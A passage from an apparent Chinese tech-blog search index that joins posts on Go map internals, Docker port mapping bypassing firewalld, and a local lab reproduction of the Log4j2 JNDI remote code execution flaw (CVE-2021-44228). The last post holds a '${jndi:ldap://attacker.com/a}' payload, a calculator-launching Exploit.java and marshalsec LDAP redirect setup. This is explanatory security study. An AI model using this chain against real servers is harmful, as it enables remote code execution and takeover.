函数主要考察的是两点：性能、碰撞概率。 key的定位过程 key 经过哈希计算后得到哈希值，共 64 个 bit 位（64位机，32位机就不讨论了，现在主流都是64位机），计算它到底要落在哪个桶时，只会用到最后 B 个 bit 位。还记得前面提到过的 B 吗？如果 B = 5，那么桶的数量，也就是 buckets 数组的长度是 2^5 = 32。 例如，现在有一个 key 经过哈希函数计算后，得到的哈希结果是： 10010111 | 000011110110110010001111001010100010010110010101010 │ 01010 用最后的 5 个 bit 位，也就是 01010，值为 10，也就是 10 号桶。这个操作实际上就是取余操作，但是取余开销太大，所以代码实现上用的位操作代替。 再用哈希值的高 8 位，找到此 key 在 bucket 中的位置，这是在寻找已有的 key。最开始桶内还没有 key，新加入的 key 会找到第一个空位，放入。 buckets 编号就是桶编号，当两个不同的 key 落在同一个桶中，也就是发生了哈希冲突。冲突的解决手段是用链表法：在 bucket 中，从前往后找到第一个空位。这样，在查找某个 key 时，先找到对应的桶，再去遍历 bucket 中的 key。 这里参考曹大 github 博客里的一张图 key定位过程 上图中，假定 B = 5，所以 bucket 总数就是 2^5 = 32。首先计算出待查找 key 的哈希，使用低 5 位 00110，找到对应的 6 号 bucket，使用高 8 位 10010111，对应十进制 151，在 6 号 bucket 中寻找 tophash 值（HOB hash）为 151 的 key，找到了 2 号槽位，这样整个查找过程就结束了。 如果在 bucket 中没找到，并且 overflow 不为空，还要继续去 overflow bucket 中寻找，直到找到或是所有的 key 槽位都找遍了，包括所有的 overflow bucket。 看看key的查找过程 func mapaccess1(t *maptype, h *hmap, key unsafe.Pointer) unsafe.Pointer { //... // 如果 h 什么都没有，返回零值 if h == nil || h.count == 0 { return unsafe.Pointer(\u0026zeroVal[0]) } // 写和读冲突 if h.flags\u0026hashWriting != 0 { throw(\"concurrent map read and map write\") } // 不同类型 key 使用的 hash 算法在编译期确定 alg := t.key.alg // 计算哈希值，并且加入 hash0 引入随机性 hash := alg.hash(key, uintptr(h.hash0)) // 比如 B=5，那 m 就是31，二进制是全 1 // 求 bucket num 时，将 hash 与 m 相与， // 达到 bucket num 由 hash 的低 8 位决定的效果 m := bucketMask(h.B) // b 就是 bucket 的地址 b := (*bmap)(add(h.buckets, (hash\u0026m)*uintptr(t.bucketsize))) // oldbuckets 不为 nil，说明发生了扩容 if c := h.oldbuckets; c != nil { // 如果不是同 size 扩容（看后面扩容的内容） // 对应条件 1 的解决方案 if !h.sameSizeGrow() { // 新 bucket 数量是老的 2 倍 m \u003e\u003e= 1 } // 求出 key 在老的 map 中的 bucket 位置 oldb := (*bmap)(add(c, (hash\u0026m)*uintptr(t.bucketsize))) // 如果 oldb 没有搬迁到新的 bucket // 那就在老的 bucket 中寻找 if !evacuated(oldb) { b = oldb } } // 计算出高 8 位的 hash // 相当于右移 56 位，只取高8位 top := tophash(hash) //开始寻找key for ; b != nil; b = b.overflow(t) { // 遍历 8 个 bucket for i := uintptr(0); i \u003c bucketCnt; i++ { // tophash 不匹配，继续 if b.tophash[i] != top { continue } // tophash 匹配，定位到 key 的位置 k := add(unsafe.Pointer(b), dataOffset+i*uintptr(t.keysize)) // key 是指针 if t.indirectkey { // 解引用 k = *((*unsafe.Pointer)(k)) } // 如果 key 相等 if alg.equal(key, k) { // 定位到 value 的位置 v := add(unsafe.Pointer(b), dataOffset+bucketCnt*uintptr(t.keysize)+i*uintptr(t.valuesize)) // value 解引用 if t.indirectvalue { v = *((*unsafe.Pointer)(v)) } return v } } } return unsafe.Pointer(\u0026zeroVal[0]) } 函数返回 h[key] 的指针，如果 h 中没有此 key，那就会返回一个 key 相应类型的零值，不会返回 nil。 bucket 里 key 的起始地址就是 unsafe.Pointer(b)+dataOffset。第 i 个 key 的地址就要在此基础上跨过 i 个 key 的大小；而我们又知道，value 的地址是在所有 key 之后，因此第 i 个 value 的地址还需要加上所有 key 的偏移。 // key 定位公式 k :=add(unsafe.Pointer(b),dataOffset+i*uintptr(t.keysize)) // value 定位公式 v:= add(unsafe.Pointer(b),dataOffset+bucketCnt*uintptr(t.keysize)+i*uintptr(t.valuesize)) //对于 bmap 起始地址的偏移： dataOffset = unsafe.Offsetof(struct{ b bmap v int64 }{}.v) map读取的两个操作 Go 语言中读取 map 有两种语法：带 comma 和 不带 comma。当要查询的 key 不在 map 里，带 comma 的用法会返回一个 bool 型变量提示 key 是否在 map 中；而不带 comma 的语句则会返回一个 value 类型的零值。如果 value 是 int 型就会返回 0，如果 value 是 string 类型，就会返回空字符串。 value := maps[\"1\"] value2,ok := maps[\"1\"] 以前一直觉得好神奇，怎么实现的？这其实是编译器在背后做的工作：分析代码后，将两种语法对应到底层两个不同的函数。 //src/runtime/map.go line 394 func mapaccess1(t *maptype, h *hmap, key unsafe.Pointer) unsafe.Pointer func mapaccess2(t *maptype, h *hmap, key unsafe.Pointer) (unsafe.Pointer, bool) map如何扩容 使用哈希表的目的就是要快速查找到目标 key，然而，","date":"2022-02-21","objectID":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/:0:2","tags":["Go"],"title":"go-map源码介绍","uri":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"map遍历 本来 map 的遍历过程比较简单：遍历所有的 bucket 以及它后面挂的 overflow bucket，然后挨个遍历 bucket 中的所有 cell。每个 bucket 中包含 8 个 cell，从有 key 的 cell 中取出 key 和 value，这个过程就完成了。 但是，现实并没有这么简单。还记得前面讲过的扩容过程吗？扩容过程不是一个原子的操作，它每次最多只搬运 2 个 bucket，所以如果触发了扩容操作，那么在很长时间里，map 的状态都是处于一个中间态：有些 bucket 已经搬迁到新家，而有些 bucket 还待在老地方。 因此，遍历如果发生在扩容的过程中，就会涉及到遍历新老 bucket 的过程，这是难点所在。 关于 map 迭代，先是调用 mapiterinit 函数初始化迭代器，然后循环调用 mapiternext 函数进行 map 迭代。 前面已经提到过，即使是对一个写死的 map 进行遍历，每次出来的结果也是无序的。下面我们就可以近距离地观察他们的实现了。 func mapiterinit(t *maptype, h *hmap, it *hiter) { ... it.t = t it.h = h it.B = h.B it.buckets = h.buckets if t.bucket.kind\u0026kindNoPointers != 0 { h.createOverflow() it.overflow = h.extra.overflow it.oldoverflow = h.extra.oldoverflow } r := uintptr(fastrand()) if h.B \u003e 31-bucketCntBits { r += uintptr(fastrand()) \u003c\u003c 31 } it.startBucket = r \u0026 bucketMask(h.B) it.offset = uint8(r \u003e\u003e h.B \u0026 (bucketCnt - 1)) it.bucket = it.startBucket ... mapiternext(it) } 重点是fastrand 的部分，是一个生成随机数的方法：它生成了随机数。用于决定从哪里开始循环迭代。更具体的话就是根据随机数，选择一个桶位置作为起始点进行遍历迭代因此每次重新 for range map，你见到的结果都是不一样的。那是因为它的起始位置根本就不固定！ ... // decide where to start r := uintptr(fastrand()) if h.B \u003e 31-bucketCntBits { r += uintptr(fastrand()) \u003c\u003c 31 } it.startBucket = r \u0026 bucketMask(h.B) it.offset = uint8(r \u003e\u003e h.B \u0026 (bucketCnt - 1)) // iterator state it.bucket = it.startBucket ","date":"2022-02-21","objectID":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/:0:3","tags":["Go"],"title":"go-map源码介绍","uri":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"map的赋值和更新 ，向 map 中插入或者修改 key，最终调用的是 mapassign 函数。 实际上插入或修改 key 的语法是一样的，只不过前者操作的 key 在 map 中不存在，而后者操作的 key 存在 map 中。 mapassign 有一个系列的函数，根据 key 类型的不同，编译器会将其优化为相应的“快速函数”。 整体来看，流程非常得简单：对 key 计算 hash 值，根据 hash 值按照之前的流程，找到要赋值的位置（可能是插入新 key，也可能是更新老 key），对相应位置进行赋值。 源码大体和之前讲的类似，核心还是一个双层循环，外层遍历 bucket 和它的 overflow bucket，内层遍历整个 bucket 的各个 cell 函数首先会检查 map 的标志位 flags。如果 flags 的写标志位此时被置 1 了，说明有其他协程在执行“写”操作，进而导致程序 panic。这也说明了 map 对协程是不安全的。 通过前文我们知道扩容是渐进式的，如果 map 处在扩容的过程中，那么当 key 定位到了某个 bucket 后，需要确保这个 bucket 对应的老 bucket 完成了迁移过程。即老 bucket 里的 key 都要迁移到新的 bucket 中来（分裂到 2 个新 bucket），才能在新的 bucket 中进行插入或者更新的操作。 上面说的操作是在函数靠前的位置进行的，只有进行完了这个搬迁操作后，我们才能放心地在新 bucket 里定位 key 要安置的地址，再进行之后的操作。 现在到了定位 key 应该放置的位置了，所谓找准自己的位置很重要。准备两个指针，一个（ inserti）指向 key 的 hash 值在 tophash 数组所处的位置，另一个( insertk)指向 cell 的位置（也就是 key 最终放置的地址），当然，对应 value 的位置就很容易定位出来了。这三者实际上都是关联的，在 tophash 数组中的索引位置决定了 key 在整个 bucket 中的位置（共 8 个 key），而 value 的位置需要“跨过” 8 个 key 的长度。 在循环的过程中，inserti 和 insertk 分别指向第一个找到的空闲的 cell。如果之后在 map 没有找到 key 的存在，也就是说原来 map 中没有此 key，这意味着插入新 key。那最终 key 的安置地址就是第一次发现的“空位”（tophash 是 empty）。 如果这个 bucket 的 8 个 key 都已经放置满了，那在跳出循环后，发现 inserti 和 insertk 都是空，这时候需要在 bucket 后面挂上 overflow bucket。当然，也有可能是在 overflow bucket 后面再挂上一个 overflow bucket。这就说明，太多 key hash 到了此 bucket。 在正式安置 key 之前，还要检查 map 的状态，看它是否需要进行扩容。如果满足扩容的条件，就主动触发一次扩容操作。 这之后，整个之前的查找定位 key 的过程，还得再重新走一次。因为扩容之后，key 的分布都发生了变化。 最后，会更新 map 相关的值，如果是插入新 key，map 的元素数量字段 count 值会加 1；在函数之初设置的 hashWriting 写标志出会清零。 ","date":"2022-02-21","objectID":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/:0:4","tags":["Go"],"title":"go-map源码介绍","uri":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"map的删除 写操作底层的执行函数是 mapdelete func mapdelete(t *maptype, h *hmap, key unsafe.Pointer) 它首先会检查 h.flags 标志，如果发现写标位是 1，直接 panic，因为这表明有其他协程同时在进行写操作。 计算 key 的哈希，找到落入的 bucket。检查此 map 如果正在扩容的过程中，直接触发一次搬迁操作。 删除操作同样是两层循环，核心还是找到 key 的具体位置。寻找过程都是类似的，在 bucket 中挨个 cell 寻找。 找到对应位置后，对 key 或者 value 进行“清零”操作： 最后，将 count 值减 1，将对应位置的 tophash 值置成 Empty。 func mapdelete(t *maptype, h *hmap, key unsafe.Pointer) { if raceenabled \u0026\u0026 h != nil { callerpc := getcallerpc() pc := funcPC(mapdelete) racewritepc(unsafe.Pointer(h), callerpc, pc) raceReadObjectPC(t.key, key, callerpc, pc) } if msanenabled \u0026\u0026 h != nil { msanread(key, t.key.size) } if h == nil || h.count == 0 { return } if h.flags\u0026hashWriting != 0 { throw(\"concurrent map writes\") } alg := t.key.alg hash := alg.hash(key, uintptr(h.hash0)) // Set hashWriting after calling alg.hash, since alg.hash may panic, // in which case we have not actually done a write (delete). h.flags |= hashWriting bucket := hash \u0026 bucketMask(h.B) if h.growing() { growWork(t, h, bucket) } b := (*bmap)(add(h.buckets, bucket*uintptr(t.bucketsize))) top := tophash(hash) search: for ; b != nil; b = b.overflow(t) { for i := uintptr(0); i \u003c bucketCnt; i++ { if b.tophash[i] != top { continue } k := add(unsafe.Pointer(b), dataOffset+i*uintptr(t.keysize)) k2 := k if t.indirectkey { k2 = *((*unsafe.Pointer)(k2)) } if !alg.equal(key, k2) { continue } // Only clear key if there are pointers in it. // 对key清零 if t.indirectkey { *(*unsafe.Pointer)(k) = nil } else if t.key.kind\u0026kindNoPointers == 0 { memclrHasPointers(k, t.key.size) } v := add(unsafe.Pointer(b), dataOffset+bucketCnt*uintptr(t.keysize)+i*uintptr(t.valuesize)) // 对value清零 if t.indirectvalue { *(*unsafe.Pointer)(v) = nil } else if t.elem.kind\u0026kindNoPointers == 0 { memclrHasPointers(v, t.elem.size) } else { memclrNoHeapPointers(v, t.elem.size) } // 高位hash清零 b.tophash[i] = empty // 个数减一 h.count-- break search } } if h.flags\u0026hashWriting == 0 { throw(\"concurrent map writes\") } h.flags \u0026^= hashWriting } Go 语言中只要是可比较的类型都可以作为 key。除开 slice，map，functions 这几种类型，其他类型都是 OK 的。具体包括：布尔值、数字、字符串、指针、通道、接口类型、结构体、只包含上述类型的数组。这些类型的共同特征是支持 == 和 != 操作符， k1==k2 时，可认为 k1 和 k2 是同一个 key。如果是结构体，则需要它们的字段值都相等，才被认为是相同的 key。 当用 float64 作为 key 的时候，先要将其转成 unit64 类型，再插入 key 中。 顺便说一句，任何类型都可以作为 value，包括 map 类型。 map的并发访问 map 并不是一个线程安全的数据结构。同时读写一个 map 是不安全的，如果被检测到，会直接 panic。 解决方法1：读写锁 sync.RWMutex。将map与读写锁定义在一个结构体，访问时加锁解锁 解决方法2：使用golang提供的 sync.Map func main() { m := sync.Map{} m.Store(1, 1) i := 0 go func() { for i \u003c 1000 { m.Store(1, 1) i++ } }() go func() { for i \u003c 1000 { m.Store(2, 2) i++ } }() go func() { for i \u003c 1000 { fmt.Println(m.Load(1)) i++ } }() for { runtime.GC() } } 最后看一看下列代码如果觉得和想的不一样，可以试试并想想为什么。 var m map[string]string //m == nil delete(m,\"name\") //不会panic fmt.Println(m[\"name\"]) //返回类型默认值 m[\"name\"] = \"Li\" //panic ","date":"2022-02-21","objectID":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/:0:5","tags":["Go"],"title":"go-map源码介绍","uri":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/"},{"categories":["Go"],"content":"总结 总结一下，Go 语言中，通过哈希查找表实现 map，用链表法解决哈希冲突。 通过 key 的哈希值将 key 散落到不同的桶中，每个桶中有 8 个 cell。哈希值的低位决定桶序号，高位标识同一个桶中的不同 key。 当向桶中添加了很多 key，造成元素过多，或者溢出桶太多，就会触发扩容。扩容分为等量扩容和 2 倍容量扩容。扩容后，原来一个 bucket 中的 key 一分为二，会被重新分配到两个桶中。 扩容过程是渐进的，主要是防止一次扩容需要搬迁的 key 数量过多，引发性能问题。触发扩容的时机是增加了新元素，bucket 搬迁的时机则发生在赋值、删除期间，每次最多搬迁两个 bucket。 查找、赋值、删除的一个很核心的内容是如何定位到 key 所在的位置. ","date":"2022-02-21","objectID":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/:1:0","tags":["Go"],"title":"go-map源码介绍","uri":"/posts/2022/02/go-map%E6%BA%90%E7%A0%81%E4%BB%8B%E7%BB%8D/"},{"categories":["Linux"],"content":"linux防火墙firewall无法禁用docker端口映射问题 通过命令检查docker # 查找端口5001服务的进程，进程好为$pid netstat -antlp |grep 5001 ps -ef |grep $pid # 端口tcp服务测试 curl http://127.0.0.1:5001 # 发现服务端口没有被拒绝，可访问 操作界面 [root@node1 ~]# [root@node1 ~]# netstat -antlp |grep :5001 tcp6 0 0 :::5001 :::* LISTEN 92108/docker-proxy [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# ps -ef |grep 92108 root 81120 75037 0 10:31 pts/3 00:00:00 grep --color=auto 92108 root 92108 89252 0 Dec23 ? 00:00:00 /usr/bin/docker-proxy -proto tcp -host-ip :: -host-port 5001 -container-ip 172.18.0.10 -container-port 8080 [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# curl http://127.0.0.1:5001 \u003chtml\u003e \u003chead\u003e\u003ctitle\u003e308 Permanent Redirect\u003c/title\u003e\u003c/head\u003e \u003cbody\u003e \u003ccenter\u003e\u003ch1\u003e308 Permanent Redirect\u003c/h1\u003e\u003c/center\u003e \u003chr\u003e\u003ccenter\u003enginx\u003c/center\u003e \u003c/body\u003e \u003c/html\u003e [root@node1 ~]# [root@node1 ~]# [root@node1 ~]# iptables-save |grep 5001 -A DOCKER ! -i br-26197ef9daf9 -p tcp -m tcp --dport 5001 -j DNAT --to-destination 172.18.0.10:8080 [root@node1 ~]# 问题：防火墙firewalld已配置5001端口禁用，但测试发现该端口仍能访问。 ","date":"2022-01-03","objectID":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/:0:0","tags":["Linux"],"title":"linux防火墙firewall无法禁用docker端口映射问题","uri":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/"},{"categories":["Linux"],"content":"方式一：修改iptables 在docker中运行第三方服务时，通常需要绑定服务端口到本地主机。但使用 -p 参数进行的端口映射，会自动在iptables中建立规则，绕过firewalld，这对于端口级的黑白名单控制管理是很不利的，所以我们需要对iptables进行手动修改。 这里以从名为centos.19.09.05的image建立一个容器为例： 首先，如果系统是CentOS7的话，需要关闭自带firewalld防火墙，并切换为iptables. 假设需要将新容器的27017端口映射到主机的27017端口，一般情况下我们使用命令 docker run -idt -p 27017:27017 centos.19.09.05 /bin/bash 在容器中27017端口服务运行起来后，我们在外网使用端口扫描工具，发现本地主机的27017端口已经打开了，而我们还未在防火墙上进行开放操作；此时检查iptabes规则： iptables --list 发现在Chain DOCKER下多出了一条 Chain DOCKER (1 references) target prot opt source destination ACCEPT tcp -- anywhere 172.17.0.2 tcp dpt:27017 其中172.17.0.2为该容器在docker网桥中的IP，可见该规则允许任意来源的地址访问27017端口，所以我们需要删除该规则，并替换成安全性更高的规则。 #删除DOCKER链中的1号规则；如果待删除规则不位于第一行，则将数字改为对应行号 iptables -D DOCKER 1 #此容器只接受来自地址123.345.456.567的连接请求 iptables -A DOCKER -s 123.345.456.567 -d 172.17.0.2 -p tcp --sport 27017 -j ACCEPT 再次进行端口扫描，发现27017端口已经关闭，只有IP为123.234.345.456的主机能够连接。 iptables端口屏蔽命令，参考如下 # tcp # iptables -D INPUT -p ${protocl_list[$i]} --dport ${port_list[$i]} -j REJECT --reject-with tcp-reset iptables -D INPUT -p tcp --dport 5001 -j REJECT --reject-with tcp-reset # udp # iptables -D INPUT -p ${protocl_list[$i]} --dport ${port_list[$i]} -j DROP iptables -D INPUT -p udp --dport 33333 -j DROP ","date":"2022-01-03","objectID":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/:1:0","tags":["Linux"],"title":"linux防火墙firewall无法禁用docker端口映射问题","uri":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/"},{"categories":["Linux"],"content":"方式二：修改docker配置 还有一种更简单的方式。因为docker绕过防火墙的原理是修改了iptables，那不让它修改即可，此方法无需切换默认防火墙。 --iptables=false 按照https://blog.csdn.net/qadzhangc/article/details/96140703 所述设置即可，经试验不可省略步骤，否则可能造成容器无法连接外网。 vim /etc/default/docker #修改文件，此处设置等同于在创建容器时手动指定iptables=false参数 DOCKER_OPTS=\"--dns 8.8.8.8 --dns 8.8.4.4 --iptables=false\" vim /etc/docker/daemon.json { \"iptables\": false }#此处对更改设置之前创建的容器也有效，编辑后需重启docker服务 对ufw的设置主要是为容器建立起转发，如果容器内的服务不需要访问外网，不做也可以。 firewalld的操作与ufw有些不同 #ubuntu(ufw)操作为 vim /etc/default/ufw DEFAULT_FORWARD_POLICY=\"ACCEPT\" #对应centos(firewalld)上操作为： firewall-cmd --permanent --direct --add-rule ipv4 filter FORWARD_direct 0 -i eth0 -j ACCEPT #eth0为宿主机网卡名 firewall-cmd --permanent --direct --add-rule ipv4 filter FORWARD_direct 0 -o eth0 -j ACCEPT firewall-cmd --reload ubuntu(ufw): vim /etc/ufw/before.rules 在`*filter`前面添加下面内容 *nat :POSTROUTING ACCEPT [0:0] -A POSTROUTING ! -o docker0 -s 172.17.0.0/16 -j MASQUERADE COMMIT centos(firewalld): firewall-cmd --zone=public --add-masquerade #默认docker0在public zone里 firewall-cmd --reload ","date":"2022-01-03","objectID":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/:2:0","tags":["Linux"],"title":"linux防火墙firewall无法禁用docker端口映射问题","uri":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/"},{"categories":["Linux"],"content":"firewalld开启端口配置 比如开启某服务（mysql）端口：3306，可以使用下面命令 aport=3306 firewall-cmd --zone=public --add-port=${aport}/tcp --permanent firewall-cmd --reload ","date":"2022-01-03","objectID":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/:3:0","tags":["Linux"],"title":"linux防火墙firewall无法禁用docker端口映射问题","uri":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/"},{"categories":["Linux"],"content":"附录 解决docker容器开启端口映射后，会自动在防火墙上打开端口的问题 ","date":"2022-01-03","objectID":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/:4:0","tags":["Linux"],"title":"linux防火墙firewall无法禁用docker端口映射问题","uri":"/posts/2022/01/linux%E9%98%B2%E7%81%AB%E5%A2%99firewall%E6%97%A0%E6%B3%95%E7%A6%81%E7%94%A8docker%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E9%97%AE%E9%A2%98/"},{"categories":["Java"],"content":"背景 最近，互联网上曝出了 Apache Log4j2 中的远程代码执行漏洞，攻击者可利用此漏洞构造特殊的数据请求包，最终触发远程代码执行。 要知道，绝大部分的Java应用用的都是Log4j的包记录日志，而很多互联网公司用的是Log4j2，据“白帽”分析确认，几乎所有技术巨头如百度等都是该 Log4j 远程代码执行漏洞的受害者。 漏洞原理官方表述是：Apache Log4j2 中存在JNDI注入漏洞，当程序将用户输入的数据进行日志记录时，即可触发此漏洞，成功利用此漏洞可以在目标服务器上执行任意代码。 通俗简单的说就是：在打印日志的时候，如果你的日志内容中包含[关键词] ${，攻击者就能将关键字所包含的内容当作变量来替换成任何攻击命令，并且执行。 由于 Apache Log4j2 的某些函数具有递归分析函数，因此攻击者可以直接构造恶意请求来触发远程代码执行漏洞。 Apache Log4j2 Apache Log4j2 是一款开源的 Java 日志记录工具，大量的业务框架都使用了该组件。此次漏洞是用于 Log4j2 提供的 lookup 功能造成的，该功能允许开发者通过一些协议去读取相应环境中的配置。但在实现的过程中，并未对输入进行严格的判断，从而造成漏洞的发生。 漏洞检测方案 1、通过流量监测设备监控是否有相关 DNSLog 域名的请求 2、通过监测相关日志中是否存在“jndi:ldap://”、“jndi:rmi”等字符来发现可能的攻击行为。 漏洞详情： Apache Log4j 远程代码执行漏洞 严重程度: 严重由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置**漏洞情况分析：**Apache Log4j是一个基于Java的日志记录组件。Apache Log4j2是Log4j的升级版本，通过重写Log4j引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。 漏洞编号：暂缺漏洞 等级： 高危，该漏洞影响范围极广，危害极大。 CVSS评分： 10（最高级） 漏洞状态： 受影响的版本： Apache log4j2 2.0 - 2.14.1 版本均受影响。 安全版本： Apache log4j-2.15.0-rc2 ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:1:0","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"触发过程 用户发送数据到服务器，不管什么协议，http也好，别的也好 服务器记录用户请求中的数据，数据中包含恶意payload：${jndi:ldap://attacker.com/a}，其中attacker.com是攻击者的服务器 log4j向attacker.com发送请求（jndi）时触发漏洞，因为有个$符号 log4j收到的jndi响应中包含一个java class文件路径，比如是 http://second-stage.attacker.com/Exploit.class，这个class文件会被log4j所运行在的服务器加载运行 第4步中注入的java class文件中的代码是攻击者的攻击代码 ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:2:0","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"本地windows环境复现操作 ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:3:0","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"1. 注入程序（脚本）准备 编译Exploit.java，该注入程序为打开计算器操作 git clone https://github.com/tangxiaofeng7/apache-log4j-poc.git cd apache-log4j-poc/src/main/java javac Exploit.java Exploit.java public class Exploit { public Exploit() {} static { try { String[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"win\") ? new String[]{\"cmd.exe\",\"/c\", \"calc.exe\"} : new String[]{\"open\",\"/System/Applications/Calculator.app\"}; java.lang.Runtime.getRuntime().exec(cmds).waitFor(); }catch (Exception e){ e.printStackTrace(); } } public static void main(String[] args) { Exploit e = new Exploit(); } } ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:3:1","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"2. 启动fileserver 服务url：127.0.0.1:8989/files ， fileserver同目录下有tmp放置files，这里放了Exploit.class ./fileserver fileserver 是自己用go写的httpserver，端口：8989，用于文件下载 $ ./fileserver 2021/12/14 16:51:27 Server started on localhost:8989, use ./tmp for uploading files and /files/{fileName} for downloading ","date":"2021-12-15","objectID":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/:3:2","tags":["Java"],"title":"CVE-2021-44228-Apache-Log4j2-Rce安全漏洞触发复现","uri":"/posts/2021/12/cve-2021-44228-apache-log4j2-rce%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E8%A7%A6%E5%8F%91%E5%A4%8D%E7%8E%B0/"},{"categories":["Java"],"content":"3. 编译运行marshalsec工具 启动LDAPRefServer ， 重定向到 http://127.0.0.1:8989/files/#Exploit git clone https://github.com/mbechler/marshalsec.git cd marshalsec # Java 8 required mvn clean package -DskipTests cd target java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8989/files/#Exploit\" 启动后，监听1389端口 $ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://127.0.0.1:8989/files/#Exploit\" Listening on 